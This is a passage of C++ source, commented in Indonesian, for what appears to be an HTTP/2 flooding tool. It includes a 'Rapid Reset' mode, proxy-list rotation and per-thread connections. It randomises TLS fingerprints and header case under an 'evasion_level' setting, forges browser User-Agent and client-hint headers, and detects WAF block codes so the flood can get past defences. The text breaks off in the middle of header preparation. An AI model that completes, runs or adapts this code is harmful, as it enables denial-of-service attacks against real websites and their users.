#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cerrno>
#include <random>
#include <algorithm>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <mutex>
#include <iomanip>
#include <sstream>
#include <fstream> 
#include <set>    
#include <map>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h> 
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/select.h> 

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/conf.h>
#include <openssl/crypto.h>

#include <nghttp2/nghttp2.h>

#ifndef NGHTTP2_H
#error "File header nghttp2/nghttp2.h tidak ditemukan atau tidak disertakan dengan benar. Pastikan libnghttp2-dev (atau yang setara) terinstal dan pkg-config dikonfigurasi dengan benar."
#endif
#ifndef NGHTTP2_VERSION_NUM
#warning "NGHTTP2_VERSION_NUM tidak terdefinisi. Ini mungkin mengindikasikan masalah dengan instalasi nghttp2 atau file header."
#endif

#define ARRLEN(x) (sizeof(x) / sizeof(x[0]))

struct ProxyInfo {
    std::string host;
    uint16_t port;
};

struct Connection {
    SSL *ssl;
    nghttp2_session *session;
    std::string host; 
    std::string path; // Path asli tanpa query parameter acak
    uint16_t port;
    int sock_fd;
    int32_t stream_id; // Digunakan untuk mode GET normal
    std::atomic<bool> stream_closed; // Digunakan untuk mode GET normal
    int http_status_code; // Untuk menyimpan status HTTP dari respons stream saat ini
    std::atomic<bool> waf_block_suspected; // Flag jika WAF block terdeteksi dari status HTTP
    std::vector<int> custom_waf_codes_to_check; // Daftar status kode WAF kustom


    // Digunakan oleh kedua mode (GET normal dan Rapid Reset) untuk menyimpan header yang akan dikirim
    std::vector<std::pair<std::string, std::string>> header_storage; 

    int thread_id_for_logging; // ID thread untuk keperluan logging

    Connection() : ssl(nullptr), session(nullptr), port(443), sock_fd(-1), 
                   stream_id(0), stream_closed(false), http_status_code(0), 
                   waf_block_suspected(false), thread_id_for_logging(-1) {}
};

// --- Forward Declarations ---
void *get_in_addr(struct sockaddr *sa);
bool perform_tls_handshake(Connection *conn); 
bool parse_proxy_string(const std::string& proxy_str, std::string& host, uint16_t& port); 
std::vector<ProxyInfo> load_proxies_from_file(const std::string& filename); 
void prepare_headers(Connection *conn, std::mt19937& gen, 
                     const std::string& custom_user_agent, 
                     const std::string& custom_cookie, 
                     const std::string& chosen_platform,
                     bool add_extra_headers_flag,
                     bool is_rapid_reset_mode, 
                     const std::string& path_for_request,
                     const std::string& original_target_host,
                     int evasion_level 
                     );
std::string generate_random_string(std::mt19937& gen, size_t length);
int get_random_int(int min, int max, std::mt19937& gen);
std::string generate_random_version_string(std::mt19937& gen, int major_min, int major_max, int minor_min, int minor_max, int build_min, int build_max, bool include_patch = true);
std::string build_cipher_list_string(const std::vector<std::string>& ciphers);
std::string randomize_header_case(const std::string& header_name, std::mt19937& gen);
SSL_CTX *create_ssl_context(int thread_id_for_logging, std::mt19937& gen, int evasion_level); // evasion_level ditambahkan
std::vector<int> parse_status_codes(const std::string& codes_str);


// Mutex global untuk melindungi output konsol (std::cout, std::cerr)
std::mutex global_console_mutex;

// --- Fungsi Logging ---
void log_info_global(int thread_id, const std::string& msg) {
    std::lock_guard<std::mutex> lock(global_console_mutex);
    std::cout << "[Thread " << std::setw(2) << thread_id << "] " << msg << std::endl;
}

void log_error_global(int thread_id, const std::string& msg) {
    std::lock_guard<std::mutex> lock(global_console_mutex);
    std::cerr << "[Thread " << std::setw(2) << thread_id << "] ERROR: " << msg << std::endl;
}

// --- Callback nghttp2 ---
static ssize_t send_callback(nghttp2_session *session, const uint8_t *data,
                                  size_t length, int flags, void *user_data) {
    Connection *conn = (Connection *)user_data;
    ssize_t rv;
    ERR_clear_error(); 
    rv = SSL_write(conn->ssl, data, length);
    if (rv <= 0) {
        int err = SSL_get_error(conn->ssl, rv);
        if (err == SSL_ERROR_WANT_WRITE || err == SSL_ERROR_WANT_READ) {
            return NGHTTP2_ERR_WOULDBLOCK; 
        }
        return NGHTTP2_ERR_CALLBACK_FAILURE; 
    }
    return rv;
}

static int on_data_chunk_recv_callback(nghttp2_session *session, uint8_t flags,
                                          int32_t stream_id, const uint8_t *data,
                                          size_t len, void *user_data) {
    return 0; 
}

static int on_header_callback(nghttp2_session *session,
                                  const nghttp2_frame *frame, const uint8_t *name,
                                  size_t namelen, const uint8_t *value,
                                  size_t valuelen, uint8_t flags,
                                  void *user_data) {
    Connection *conn = (Connection *)user_data;
    if (frame->hd.type == NGHTTP2_HEADERS && frame->headers.cat == NGHTTP2_HCAT_RESPONSE) {
        if (conn && frame->hd.stream_id == conn->stream_id) { 
            std::string header_name((const char*)name, namelen);
            if (header_name == ":status") {
                std::string status_str((const char*)value, valuelen);
                try {
                    int status = std::stoi(status_str);
                    conn->http_status_code = status; 
                    
                    bool block_detected = false;
                    if (!conn->custom_waf_codes_to_check.empty()) { 
                        for (int code : conn->custom_waf_codes_to_check) {
                            if (status == code) {
                                block_detected = true;
                                break;
                            }
                        }
                    } else { 
                        if (status == 403 || status == 429 || status == 503 || status == 401 || status == 406) { 
                            block_detected = true;
                        }
                    }

                    if (block_detected) {
                        conn->waf_block_suspected.store(true, std::memory_order_relaxed);
                    }

                } catch (const std::exception& e) {
                    // log_error_global(conn->thread_id_for_logging, "Error parsing status code: " + status_str);
                }
            }
        }
    }
    return 0; 
}

static int on_frame_recv_callback(nghttp2_session *session,
                                      const nghttp2_frame *frame,
                                      void *user_data) {
    return 0; 
}

static int on_stream_close_callback(nghttp2_session *session, int32_t stream_id,
                                      uint32_t error_code, void *user_data) {
    Connection *conn = (Connection *)user_data;
    if (stream_id == conn->stream_id && !(error_code == NGHTTP2_NO_ERROR || error_code == NGHTTP2_CANCEL)) { 
    }
    if (stream_id == conn->stream_id) { 
         conn->stream_closed.store(true, std::memory_order_relaxed);
    }
    return 0; 
}

// --- Inisialisasi dan Cleanup OpenSSL ---
void init_openssl() {
    OPENSSL_init_ssl(OPENSSL_INIT_LOAD_SSL_STRINGS | OPENSSL_INIT_LOAD_CRYPTO_STRINGS, NULL);
    OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS | OPENSSL_INIT_LOAD_CONFIG, NULL);
}

void cleanup_openssl() {
    EVP_cleanup();
    CRYPTO_cleanup_all_ex_data();
    ERR_free_strings();
}

// Helper untuk membangun string cipher list dari vector
std::string build_cipher_list_string(const std::vector<std::string>& ciphers) {
    std::ostringstream oss;
    for (size_t i = 0; i < ciphers.size(); ++i) {
        oss << ciphers[i];
        if (i < ciphers.size() - 1) {
            oss << ":";
        }
    }
    return oss.str();
}


SSL_CTX *create_ssl_context(int thread_id_for_logging, std::mt19937& gen, int evasion_level) { 
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        log_error_global(thread_id_for_logging, "Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        return nullptr;
    }

    if (SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION) == 0) {
        log_error_global(thread_id_for_logging, "Failed to set min TLS version to TLSv1.2. Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
        SSL_CTX_free(ctx); return nullptr;
    }
    // SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION); // Opsional: aktifkan TLS 1.3

    std::string ciphersuites_tls13_str;
    std::string ciphers_tls12_str;
    std::string sigalgs_list_str;
    std::string curves_list_str;

    if (evasion_level > 0) { // Terapkan randomisasi jika evasion_level > 0
        std::vector<std::string> all_tls13_ciphers = {
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"
        };
        std::vector<std::string> all_tls12_ciphers = {
            "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
            "AES128-GCM-SHA256", "AES256-GCM-SHA384", 
            "DHE-RSA-AES128-GCM-SHA256", "DHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-AES128-SHA", "ECDHE-RSA-AES128-SHA", 
            "ECDHE-ECDSA-AES256-SHA", "ECDHE-RSA-AES256-SHA"
        };

        std::shuffle(all_tls13_ciphers.begin(), all_tls13_ciphers.end(), gen);
        std::shuffle(all_tls12_ciphers.begin(), all_tls12_ciphers.end(), gen);

        size_t num_tls13_to_use = all_tls13_ciphers.empty() ? 0 : std::min((size_t)get_random_int(1, all_tls13_ciphers.size(), gen), all_tls13_ciphers.size());
        size_t num_tls12_to_use = all_tls12_ciphers.empty() ? 0 : std::min((size_t)get_random_int(4, all_tls12_ciphers.size(), gen), all_tls12_ciphers.size()); 
        
        std::vector<std::string> final_tls13_ciphers(all_tls13_ciphers.begin(), all_tls13_ciphers.begin() + num_tls13_to_use);
        std::vector<std::string> final_tls12_ciphers(all_tls12_ciphers.begin(), all_tls12_ciphers.begin() + num_tls12_to_use);
        
        ciphersuites_tls13_str = build_cipher_list_string(final_tls13_ciphers);
        ciphers_tls12_str = build_cipher_list_string(final_tls12_ciphers);

        std::vector<std::string> sigalgs_options = {
            "ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256",
            "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384",
            "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"
        };
        std::shuffle(sigalgs_options.begin(), sigalgs_options.end(), gen);
        sigalgs_list_str = build_cipher_list_string(sigalgs_options); 

        std::vector<std::string> curves_options = {"P-256", "P-384", "P-521", "X25519", "X448"};
        std::shuffle(curves_options.begin(), curves_options.end(), gen);
        size_t num_curves_to_use = curves_options.empty() ? 0 : std::min((size_t)get_random_int(2, curves_options.size(), gen), curves_options.size());
        std::vector<std::string> final_curves(curves_options.begin(), curves_options.begin() + num_curves_to_use);
        curves_list_str = build_cipher_list_string(final_curves);

    } else { 
        ciphersuites_tls13_str = "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256";
        ciphers_tls12_str = "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384";
        sigalgs_list_str = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384";
        curves_list_str = "P-256:X25519:P-384:P-521"; 
    }


    if (!ciphersuites_tls13_str.empty()) {
        if (SSL_CTX_set_ciphersuites(ctx, ciphersuites_tls13_str.c_str()) != 1) {
            // log_error_global(thread_id_for_logging, "Warning: Failed to set TLSv1.3 ciphersuites: " + ciphersuites_tls13_str);
        }
    }
    if (!ciphers_tls12_str.empty()) {
        if (SSL_CTX_set_cipher_list(ctx, ciphers_tls12_str.c_str()) != 1) {
            log_error_global(thread_id_for_logging, "Failed to set TLSv1.2 cipher list: " + ciphers_tls12_str + ". Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
            SSL_CTX_free(ctx); return nullptr;
        }
    } else if (ciphersuites_tls13_str.empty()) { 
         log_error_global(thread_id_for_logging, "Error: No ciphers selected for TLSv1.2 or TLSv1.3.");
         SSL_CTX_free(ctx); return nullptr;
    }

    if (SSL_CTX_set1_sigalgs_list(ctx, sigalgs_list_str.c_str()) != 1) {
        log_error_global(thread_id_for_logging, "Failed to set signature algorithms list. Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
        SSL_CTX_free(ctx); return nullptr;
    }
    
    if (!curves_list_str.empty()) {
        if (SSL_CTX_set1_curves_list(ctx, curves_list_str.c_str()) != 1) {
            // log_error_global(thread_id_for_logging, "Warning: Failed to set supported curves list: " + curves_list_str);
        }
    }


    long secure_options = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION |
                          SSL_OP_NO_RENEGOTIATION | SSL_OP_ALL;
    SSL_CTX_set_options(ctx, secure_options);
    
    return ctx;
}

// --- Fungsi Jaringan ---
ssize_t send_all_nonblocking(int sockfd, const char *buf, size_t len, int thread_id) {
    size_t total_sent = 0;
    while (total_sent < len) {
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(sockfd, &wfds);
        struct timeval tv;
        tv.tv_sec = 5; 
        tv.tv_usec = 0;

        int rv = select(sockfd + 1, nullptr, &wfds, nullptr, &tv);
        if (rv == -1) {
            return -1; 
        } else if (rv == 0) {
            return -2; 
        }

        if (FD_ISSET(sockfd, &wfds)) {
            ssize_t n = send(sockfd, buf + total_sent, len - total_sent, MSG_NOSIGNAL);
            if (n == -1) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue; 
                }
                return -1; 
            }
            if (n == 0) { 
                return -1; 
            }
            total_sent += n;
        }
    }
    return total_sent;
}

std::string read_proxy_http_response(int sockfd, int thread_id) {
    char buf[4096];
    std::string response_str;
    ssize_t nbytes;
    
    auto start_time = std::chrono::steady_clock::now();
    std::chrono::seconds timeout_duration(10); 

    while (true) {
        auto current_time = std::chrono::steady_clock::now();
        if (current_time - start_time > timeout_duration) {
            return ""; 
        }

        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(sockfd, &rfds);
        struct timeval tv;
        
        auto remaining_time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(timeout_duration - (current_time - start_time));
        if (remaining_time_ms.count() <= 0) {
             return ""; 
        }
        tv.tv_sec = remaining_time_ms.count() / 1000;
        tv.tv_usec = (remaining_time_ms.count() % 1000) * 1000;


        int rv = select(sockfd + 1, &rfds, nullptr, nullptr, &tv);
        if (rv == -1) {
            return ""; 
        } else if (rv == 0) {
            return ""; 
        }

        if (FD_ISSET(sockfd, &rfds)) {
            nbytes = recv(sockfd, buf, sizeof(buf) - 1, 0);
            if (nbytes > 0) {
                buf[nbytes] = '\0';
                response_str.append(buf, nbytes);
                if (response_str.find("\r\n\r\n") != std::string::npos) {
                    break; 
                }
                if (response_str.length() >= sizeof(buf) -1) { 
                    break; 
                }
            } else if (nbytes == 0) {
                return ""; 
            } else { 
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue; 
                }
                return ""; 
            }
        }
    }
    return response_str;
}

void *get_in_addr(struct sockaddr *sa) { 
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}


int connect_tcp(const char *target_host_str, uint16_t target_port,
                const std::string& proxy_host, uint16_t proxy_port_uint, 
                int thread_id) {
    int sock_fd = -1;
    struct addrinfo hints, *servinfo, *p;
    int rv;
    char port_str[6];

    const char *conn_host_str;
    uint16_t conn_port;

    if (!proxy_host.empty() && proxy_port_uint > 0) {
        conn_host_str = proxy_host.c_str();
        conn_port = proxy_port_uint;
    } else {
        conn_host_str = target_host_str;
        conn_port = target_port;
    }

    snprintf(port_str, sizeof(port_str), "%u", conn_port);
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((rv = getaddrinfo(conn_host_str, port_str, &hints, &servinfo)) != 0) {
        return -1;
    }

    for (p = servinfo; p != nullptr; p = p->ai_next) {
        if ((sock_fd = socket(p->ai_family, p->ai_socktype | SOCK_NONBLOCK, p->ai_protocol)) == -1) {
            continue;
        }

        int optval = 1;
        if (setsockopt(sock_fd, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) == -1) {
            // Peringatan opsional
        }

        rv = connect(sock_fd, p->ai_addr, p->ai_addrlen);
        if (rv == -1 && errno != EINPROGRESS) {
            close(sock_fd);
            sock_fd = -1;
            continue;
        }
        
        if (rv == -1 && errno == EINPROGRESS) {
            fd_set wfds;
            FD_ZERO(&wfds);
            FD_SET(sock_fd, &wfds);
            struct timeval tv;
            tv.tv_sec = 5; 
            tv.tv_usec = 0;

            int select_rv = select(sock_fd + 1, nullptr, &wfds, nullptr, &tv);
            if (select_rv <= 0) { 
                close(sock_fd);
                sock_fd = -1;
                continue;
            }
            int so_error;
            socklen_t len = sizeof(so_error);
            getsockopt(sock_fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
            if (so_error != 0) {
                close(sock_fd);
                sock_fd = -1;
                continue;
            }
        }
        break; 
    }

    if (p == nullptr || sock_fd == -1) {
        if(servinfo) freeaddrinfo(servinfo);
        return -1;
    }
    if(servinfo) freeaddrinfo(servinfo); 

    if (!proxy_host.empty() && proxy_port_uint > 0) {
        std::ostringstream connect_req_ss;
        connect_req_ss << "CONNECT " << target_host_str << ":" << target_port << " HTTP/1.1\r\n"
                       << "Host: " << target_host_str << ":" << target_port << "\r\n"
                       << "Proxy-Connection: Keep-Alive\r\n"
                       << "Connection: Keep-Alive\r\n\r\n";
        std::string connect_req = connect_req_ss.str();

        ssize_t sent_bytes = send_all_nonblocking(sock_fd, connect_req.c_str(), connect_req.length(), thread_id);
        if (sent_bytes < (ssize_t)connect_req.length()) {
            close(sock_fd);
            return -1;
        }

        std::string proxy_response = read_proxy_http_response(sock_fd, thread_id);
        if (proxy_response.empty()) {
            close(sock_fd);
            return -1;
        }

        if (proxy_response.rfind("HTTP/1.1 200", 0) == 0 || proxy_response.rfind("HTTP/1.0 200", 0) == 0) {
            // Berhasil
        } else {
            close(sock_fd);
            return -1;
        }
    }
    return sock_fd;
}

bool perform_tls_handshake(Connection *conn) {
    unsigned char alpn_protos[] = {2, 'h', '2'}; 
    if (SSL_set_alpn_protos(conn->ssl, alpn_protos, sizeof(alpn_protos)) != 0) {
        log_error_global(conn->thread_id_for_logging, "Failed to set ALPN protos. Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
        return false;
    }

    if (!conn->host.empty()) {
        if (SSL_set_tlsext_host_name(conn->ssl, conn->host.c_str()) != 1) {
            log_error_global(conn->thread_id_for_logging, "Failed to set SNI for host: " + conn->host + ". Error: " + std::string(ERR_reason_error_string(ERR_get_error())));
            return false;
        }
    }

    int rv;
    while(true) {
        ERR_clear_error();
        rv = SSL_connect(conn->ssl);
        if (rv == 1) break; 

        int err = SSL_get_error(conn->ssl, rv);
        if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
            fd_set readfds, writefds;
            struct timeval tv;
            int select_rv;

            FD_ZERO(&readfds);
            FD_ZERO(&writefds);

            if (err == SSL_ERROR_WANT_READ) FD_SET(conn->sock_fd, &readfds);
            if (err == SSL_ERROR_WANT_WRITE) FD_SET(conn->sock_fd, &writefds);

            tv.tv_sec = 5; 
            tv.tv_usec = 0;

            select_rv = select(conn->sock_fd + 1, &readfds, &writefds, nullptr, &tv);
            if (select_rv == -1) { 
                return false;
            } else if (select_rv == 0) { 
                return false; 
            }
        } else { 
            return false;
        }
    }

    const unsigned char *alpn_selected = nullptr;
    unsigned int alpn_selected_len = 0;
    SSL_get0_alpn_selected(conn->ssl, &alpn_selected, &alpn_selected_len);

    if (alpn_selected == nullptr || alpn_selected_len != 2 || memcmp("h2", alpn_selected, 2) != 0) {
        return false;
    }
    return true;
}


int get_random_int(int min, int max, std::mt19937& gen) {
    std::uniform_int_distribution<> distrib(min, max);
    return distrib(gen);
}

std::string generate_random_string(std::mt19937& gen, size_t length) {
    const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string random_string;
    random_string.reserve(length);
    std::uniform_int_distribution<> char_dist(0, characters.length() - 1);
    for (size_t i = 0; i < length; ++i) {
        random_string += characters[char_dist(gen)];
    }
    return random_string;
}

std::string generate_random_version_string(std::mt19937& gen, int major_min, int major_max, int minor_min, int minor_max, int build_min, int build_max, bool include_patch) {
    std::string version = std::to_string(get_random_int(major_min, major_max, gen)) + "." +
                          std::to_string(get_random_int(minor_min, minor_max, gen));
    if (include_patch) {
        version += "." + std::to_string(get_random_int(build_min, build_max, gen));
    }
    return version;
}

// Fungsi untuk mengacak kapitalisasi nama header
std::string randomize_header_case(const std::string& header_name, std::mt19937& gen) {
    std::string randomized_name = header_name;
    bool capitalize_next = true; 
    for (char &c : randomized_name) {
        if (std::isalpha(c)) {
            if (capitalize_next) {
                c = std::toupper(c);
                capitalize_next = false; 
            } else {
                if (get_random_int(0, 2, gen) == 0) { 
                     c = std::islower(c) ? std::toupper(c) : std::tolower(c);
                }
            }
        } else if (c == '-') {
            capitalize_next = true; 
        } else {
            capitalize_next = false;
        }
    }
    return randomized_name;
}


void prepare_headers(Connection *conn, std::mt19937& gen, 
                     const std::string& custom_user_agent, 
                     const std::string& custom_cookie, 
                     const std::string& chosen_platform,
                     bool add_extra_headers_flag,
                     bool is_rapid_reset_mode, 
                     const std::string& path_for_request,
                     const std::string& original_target_host,
                     int evasion_level
                     ) {
    conn->header_storage.clear(); 

    std::string finalUserAgent;
    std::string secChUaPlatformValue;
    std::string secChUaMobileValue = "?0"; 
    std::string secChUaModelValue = "\"\""; 
    std::string secChUaPlatformVersionValue;
    std::string generated_os_version_for_ua; 
    std::string main_browser_name_for_brand;
    std::string main_browser_version_for_brand_short; 
    std::string main_browser_version_for_brand_full;  
    std::string chromium_version_for_brand_short;   
    std::string chromium_version_for_brand_full;

    int chrome_like_major_version = get_random_int(118, 125, gen); 
    std::string chrome_like_major_version_str = std::to_string(chrome_like_major_version);
    std::string chrome_like_full_version_str = chrome_like_major_version_str + ".0." + 
                                               std::to_string(get_random_int(5000, 6500, gen)) + "." + 
                                               std::to_string(get_random_int(100, 200, gen));

    chromium_version_for_brand_short = chrome_like_major_version_str; 
    chromium_version_for_brand_full = chrome_like_full_version_str;

    std::vector<std::string> desktop_browser_names = {"Google Chrome", "Brave", "Microsoft Edge"}; 
    std::string random_desktop_browser_name = desktop_browser_names[get_random_int(0, desktop_browser_names.size() - 1, gen)];
    bool isBraveRandom = (random_desktop_browser_name == "Brave"); 
    
    main_browser_name_for_brand = random_desktop_browser_name;
    main_browser_version_for_brand_short = chrome_like_major_version_str;
    main_browser_version_for_brand_full = chrome_like_full_version_str;

    if (!custom_user_agent.empty()) {
        finalUserAgent = custom_user_agent;
        if (chosen_platform == "Linux") {
            secChUaPlatformValue = "\"Linux\"";
        } else if (chosen_platform == "Windows") {
            secChUaPlatformValue = "\"Windows\"";
            secChUaPlatformVersionValue = "\"" + generate_random_version_string(gen, 10, 10, 0, 0, 22000, 26100, true) + "\""; 
        } else if (chosen_platform == "Iphone") {
            secChUaPlatformValue = "\"iOS\""; 
            secChUaMobileValue = "?1";
            generated_os_version_for_ua = generate_random_version_string(gen, 16, 17, 0, 6, 0, 3, true); 
            secChUaPlatformVersionValue = "\"" + generated_os_version_for_ua + "\"";
        } else if (chosen_platform == "Android") {
            secChUaPlatformValue = "\"Android\"";
            secChUaMobileValue = "?1";
            generated_os_version_for_ua = std::to_string(get_random_int(11, 14, gen)); 
            secChUaPlatformVersionValue = "\"" + generated_os_version_for_ua + "\"";
            std::vector<std::string> android_models = {"Pixel 7", "SM-G998B", "SM-A525F", "Pixel 6 Pro"};
            secChUaModelValue = "\"" + android_models[get_random_int(0, android_models.size()-1, gen)] + "\"";
        }
    } else { 
        if (chosen_platform == "Linux") {
            finalUserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) " + main_browser_name_for_brand + "/" + main_browser_version_for_brand_full + " Safari/537.36";
            secChUaPlatformValue = "\"Linux\"";
        } else if (chosen_platform == "Windows") {
            std::string win_nt_version = "Windows NT 10.0"; 
            finalUserAgent = "Mozilla/5.0 (" + win_nt_version + "; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " + main_browser_name_for_brand + "/" + main_browser_version_for_brand_full + " Safari/537.36";
            secChUaPlatformValue = "\"Windows\"";
            secChUaPlatformVersionValue = "\"" + generate_random_version_string(gen, 10, 10, 0, 0, 22000, 26100, true) + "\""; 
        } else if (chosen_platform == "Iphone") {
            int ios_major_v = get_random_int(16, 17, gen);
            int ios_minor_v = get_random_int(0, 6, gen);
            int ios_patch_v = get_random_int(0, 3, gen);
            generated_os_version_for_ua = std::to_string(ios_major_v) + "." + std::to_string(ios_minor_v) + "." + std::to_string(ios_patch_v);
            secChUaPlatformVersionValue = "\"" + generated_os_version_for_ua + "\"";
            
            std::string safari_version_ua = std::to_string(ios_major_v) + "." + std::to_string(ios_minor_v); 
            std::string webkit_build = "605.1.15"; 
            std::string mobile_build = "15E148"; 
            finalUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS " + std::to_string(ios_major_v) + "_" + std::to_string(ios_minor_v) + "_" + std::to_string(ios_patch_v) +
                             " like Mac OS X) AppleWebKit/" + webkit_build + " (KHTML, like Gecko) Version/" + safari_version_ua + 
                             " Mobile/" + mobile_build + " Safari/" + webkit_build.substr(0, webkit_build.find_last_of('.')) + ".1"; 
            secChUaPlatformValue = "\"iOS\"";
            secChUaMobileValue = "?1";
            main_browser_name_for_brand = "Mobile Safari"; 
            main_browser_version_for_brand_short = std::to_string(ios_major_v); 
            main_browser_version_for_brand_full = generated_os_version_for_ua; 
        } else if (chosen_platform == "Android") {
            int android_os_major = get_random_int(11, 14, gen);
            generated_os_version_for_ua = std::to_string(android_os_major); 
            secChUaPlatformVersionValue = "\"" + generated_os_version_for_ua + "\""; 
            
            std::vector<std::string> android_models_ua = {"Pixel 7", "SM-G998U1", "SM-A536U", "Galaxy S23 Ultra"};
            std::string random_android_model_ua = android_models_ua[get_random_int(0, android_models_ua.size()-1, gen)];
            finalUserAgent = "Mozilla/5.0 (Linux; Android " + generated_os_version_for_ua + "; " + random_android_model_ua + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + chrome_like_major_version_str + ".0.0.0 Mobile Safari/537.36";
            secChUaPlatformValue = "\"Android\"";
            secChUaMobileValue = "?1";
            secChUaModelValue = "\"" + random_android_model_ua + "\"";
            main_browser_name_for_brand = "Google Chrome"; 
            main_browser_version_for_brand_short = chrome_like_major_version_str;
            main_browser_version_for_brand_full = chrome_like_full_version_str;
        }
    }

    std::string secChUaBrands;
    std::string secChUaFullVersionList;
    std::vector<std::pair<std::string, std::string>> brands_list_pairs; 

    std::string placeholder_brand_name;
    std::string placeholder_brand_version_short;
    std::string placeholder_brand_version_full;

    int placeholder_choice = get_random_int(1, 3, gen);
    if(placeholder_choice == 1) { placeholder_brand_name = "Not_A Brand"; placeholder_brand_version_short = "8"; placeholder_brand_version_full = "8.0.0.0"; }
    else if(placeholder_choice == 2) { placeholder_brand_name = "Not A(Brand"; placeholder_brand_version_short = "99"; placeholder_brand_version_full = "99.0.0.0"; }
    else { placeholder_brand_name = "Not:A-Brand"; placeholder_brand_version_short = "24"; placeholder_brand_version_full = "24.0.0.0"; } 


    if (chosen_platform == "Iphone" && custom_user_agent.empty()) {
        brands_list_pairs.push_back({placeholder_brand_name, placeholder_brand_version_short});
        brands_list_pairs.push_back({"Safari", main_browser_version_for_brand_short}); 
        brands_list_pairs.push_back({"Mobile Safari", main_browser_version_for_brand_short}); 
        
        std::ostringstream oss_brands, oss_full_list;
        oss_brands << "\"" << brands_list_pairs[0].first << "\";v=\"" << brands_list_pairs[0].second << "\", "
                   << "\"" << brands_list_pairs[1].first << "\";v=\"" << brands_list_pairs[1].second << "\", "
                   << "\"" << brands_list_pairs[2].first << "\";v=\"" << brands_list_pairs[2].second << "\"";
        secChUaBrands = oss_brands.str();

        oss_full_list << "\"" << brands_list_pairs[0].first << "\";v=\"" << placeholder_brand_version_full << "\", "
                      << "\"" << brands_list_pairs[1].first << "\";v=\"" << main_browser_version_for_brand_full << "\", " 
                      << "\"" << brands_list_pairs[2].first << "\";v=\"" << main_browser_version_for_brand_full << "\"";
        secChUaFullVersionList = oss_full_list.str();

    } else { 
        brands_list_pairs.push_back({placeholder_brand_name, placeholder_brand_version_short});
        brands_list_pairs.push_back({"Chromium", chromium_version_for_brand_short});
        brands_list_pairs.push_back({main_browser_name_for_brand, main_browser_version_for_brand_short});
        
        std::shuffle(brands_list_pairs.begin() + 1, brands_list_pairs.end(), gen); 

        std::ostringstream oss_brands, oss_full_list;
        for(size_t i = 0; i < brands_list_pairs.size(); ++i) {
            oss_brands << "\"" << brands_list_pairs[i].first << "\";v=\"" << brands_list_pairs[i].second << "\"";
            
            std::string full_ver_for_list;
            if (brands_list_pairs[i].first == placeholder_brand_name) {
                full_ver_for_list = placeholder_brand_version_full;
            } else if (brands_list_pairs[i].first == "Chromium"){
                 full_ver_for_list = chromium_version_for_brand_full;
            } else { 
                 full_ver_for_list = main_browser_version_for_brand_full;
            }
            oss_full_list << "\"" << brands_list_pairs[i].first << "\";v=\"" << full_ver_for_list << "\"";

            if (i < brands_list_pairs.size() - 1) {
                oss_brands << ", ";
                oss_full_list << ", ";
            }
        }
        secChUaBrands = oss_brands.str();
        secChUaFullVersionList = oss_full_list.str();
    }


    std::string acceptHeaderValue;
    std::vector<std::string> accept_langs = {
        "en-US,en;q=0.9", "en;q=0.9", "en-GB,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en;q=0.8", "zh-CN,zh;q=0.9,en;q=0.8",
        "en-US,en;q=0.9,es-MX;q=0.8,es;q=0.7"
